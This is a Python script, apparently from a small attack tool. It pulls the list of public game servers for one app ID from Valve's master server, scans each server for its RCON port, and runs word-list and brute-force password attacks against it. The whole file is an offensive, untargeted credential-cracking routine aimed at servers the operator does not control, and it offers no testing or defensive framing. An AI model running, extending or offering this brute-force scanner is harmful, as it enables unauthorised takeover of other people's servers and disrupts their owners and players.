import asyncio
import valve.source
import valve.source.a2s
import valve.source.master_server
from Methods import BruteForce
from Methods import WordList
from connection import Connection
from connection import PortScanner, PortScannerExc
from print_log import Print

word_list_file = "list.txt"


async def run():
    with valve.source.master_server.MasterServerQuerier() as msq:
        try:
            for address in msq.find(appid=u"252490"):
                try:
                    with valve.source.a2s.ServerQuerier(address) as server:
                        info = server.info()
                        Print.print(f"[{address}] -> {info['server_name']}", Print.PType.INFO)

                        try:
                            port = PortScanner.get_rcon(address[0], address[1])
                        except PortScannerExc:
                            Print.print(f"[{address}] Can't find RCON port", Print.PType.ERROR)
                            continue

                        try:
                            con = Connection(
                                f"{address[0]}:{port}",
                                WordList(word_list_file),
                                BruteForce()
                            )
                        except FileNotFoundError:
                            Print.print(f"[{address}] Can't find WordList file!", Print.PType.ERROR)
                            break

                        msg, is_success = await con.start()
                        if is_success:
                            Print.print(msg, Print.PType.OK)
                        else:
                            Print.print(msg, Print.PType.ERROR)

                except Exception as e:
                    Print.print(f"[{address}] Can't querry, Error: <{e}>", Print.PType.ERROR)
        except valve.source.NoResponseError:
            Print.print("Master server request timed out!", Print.PType.ERROR)

asyncio.get_event_loop().run_until_complete(run())
